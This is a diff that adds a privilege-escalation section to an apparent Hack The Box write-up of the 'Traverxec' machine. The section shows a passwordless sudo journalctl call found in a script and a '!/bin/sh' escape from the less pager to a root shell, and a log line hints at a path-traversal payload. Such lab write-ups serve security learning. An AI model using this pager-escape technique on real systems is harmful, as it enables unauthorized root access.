@@ -162,3 +162,44 @@ david@traverxec:~$ cat user.txt
 ```
 We've succeeded in laterally moving/priv'escalating to David and in finding out the User Flag!
 
+**PRIVILEGE ESCALATION**
+
+Exploring the directories in David, /bin has a script called *server-stats.sh*. 
+Not quite sure what this is, so let's read it. 
+
+```
+david@traverxec:~/bin$ cat server-stats.sh 
+#!/bin/bash
+
+cat /home/david/bin/server-stats.head
+echo "Load: `/usr/bin/uptime`"
+echo " "
+echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
+echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
+echo " "
+echo "Last 5 journal log lines:"
+/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
+```
+So we can see that it runs a linux command called journalctl. Ans better yet, it runs it as sudo. Hopefully without needing a password. A quick runs of the script confirms this. 
+For the next part, I head over to [GTFObins](https://gtfobins.github.io/gtfobins/journalctl/), and find that we can escalate our privilege as sudo using the journalctl command. 
+
+So the goal is to use the script to inject the arbitrary command and spawn a root shell. GTFObins explains that journalctl is likely to be used with *less*, a default pager. This means that the script runs by reading the last five logs. We're going to need put in our command by stopping the script from reading just yet. 
+For this to happen we just type in the command without the piped cat command. And then proceed to type in our priv'esc command because we'll be in the pager.  
+
+```
+david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
+-- Logs begin at Wed 2021-07-28 13:08:05 EDT, end at Wed 2021-07-28 15:38:51 EDT
+Jul 28 13:59:48 traverxec sudo[903]: pam_unix(sudo:auth): authentication failure
+Jul 28 13:59:58 traverxec sudo[903]: www-data : command not allowed ; TTY=pts/1 
+Jul 28 15:31:47 traverxec su[2892]: pam_unix(su:auth): authentication failure; l
+Jul 28 15:31:49 traverxec su[2892]: FAILED SU (to david) www-data on pts/0
+Jul 28 15:37:06 traverxec nhttpd[2324]: /../../../bin/sh sent a bad cgi header
+!/bin/sh 
+
+# whoami
+root
+
+# cat /root/root.txt
+```
+
+Success!
